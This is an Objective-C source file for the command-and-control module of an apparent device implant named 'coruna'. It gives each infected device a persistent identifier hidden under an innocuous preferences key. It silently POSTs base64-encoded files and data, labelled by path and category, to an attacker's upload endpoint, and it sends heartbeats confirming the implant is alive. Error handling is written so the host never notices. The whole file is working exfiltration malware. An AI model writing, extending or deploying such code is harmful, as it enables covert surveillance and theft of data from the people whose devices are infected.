/*
 * c2.c — C2 communication via NSURLSession (Objective-C, compiled with -x objective-c)
 *
 * Sends JSON to the Go /upload endpoint:
 *   POST https://C2_DOMAIN/upload
 *   Content-Type: application/json
 *   X-Device-UUID: <persistent uuid>
 *   Body: {"deviceUUID":"…","category":"…","path":"…","description":"…","data":"<b64>"}
 */

#import <Foundation/Foundation.h>
#include "c2.h"

/* --------------------------------------------------------------------------
 * Persistent device UUID stored in NSUserDefaults under the implant key.
 * -------------------------------------------------------------------------- */
static NSString *coruna_device_uuid(void) {
    static NSString *cached = nil;
    if (cached) return cached;
    NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
    NSString *key = @"__cru_id";
    NSString *u = [d stringForKey:key];
    if (!u || u.length == 0) {
        u = [[NSUUID UUID] UUIDString];
        [d setObject:u forKey:key];
        [d synchronize];
    }
    cached = u;
    return u;
}

/* --------------------------------------------------------------------------
 * Core upload function.
 * Blocks for up to 15 s; silently drops on error (implant must not crash host).
 * -------------------------------------------------------------------------- */
void upload_to_c2(const char *category, const char *path,
                  const char *description, const char *b64data) {
    @autoreleasepool {
        NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
        NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                            scheme, C2_DOMAIN, C2_UPLOAD];
        NSURL *url = [NSURL URLWithString:urlStr];
        if (!url) return;

        NSString *uuid = coruna_device_uuid();

        NSDictionary *bodyDict = @{
            @"deviceUUID":   uuid,
            @"category":     [NSString stringWithUTF8String:category    ?: "data"],
            @"path":         [NSString stringWithUTF8String:path        ?: ""],
            @"description":  [NSString stringWithUTF8String:description ?: ""],
            @"data":         [NSString stringWithUTF8String:b64data     ?: ""]
        };
        NSData *body = [NSJSONSerialization dataWithJSONObject:bodyDict
                                                       options:0 error:nil];
        if (!body) return;

        NSMutableURLRequest *req =
            [NSMutableURLRequest requestWithURL:url
                                    cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
                                timeoutInterval:15.0];
        [req setHTTPMethod:@"POST"];
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        [req setValue:[NSString stringWithFormat:@"%lu", (unsigned long)body.length]
   forHTTPHeaderField:@"Content-Length"];
        [req setValue:uuid forHTTPHeaderField:@"X-Device-UUID"];
        [req setHTTPBody:body];

        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        NSURLSessionConfiguration *cfg =
            [NSURLSessionConfiguration ephemeralSessionConfiguration];
        cfg.timeoutIntervalForRequest  = 15.0;
        cfg.timeoutIntervalForResource = 15.0;

        NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
        [[session dataTaskWithRequest:req
                    completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
            dispatch_semaphore_signal(sem);
        }] resume];

        dispatch_semaphore_wait(sem,
            dispatch_time(DISPATCH_TIME_NOW, 15 * NSEC_PER_SEC));
        [session invalidateAndCancel];
    }
}

/* --------------------------------------------------------------------------
 * Heartbeat — confirms implant is alive; data = base64("heartbeat")
 * -------------------------------------------------------------------------- */
void c2_heartbeat(void) {
    upload_to_c2("system", "/coruna/heartbeat", "coruna implant alive",
                 "aGVhcnRiZWF0"); /* base64("heartbeat") */
}

/* --------------------------------------------------------------------------
 * Legacy stub — old raw-socket callers compile without changes.
 * -------------------------------------------------------------------------- */
void send_to_c2(const uint8_t *data, size_t len) {
    (void)data; (void)len;
}
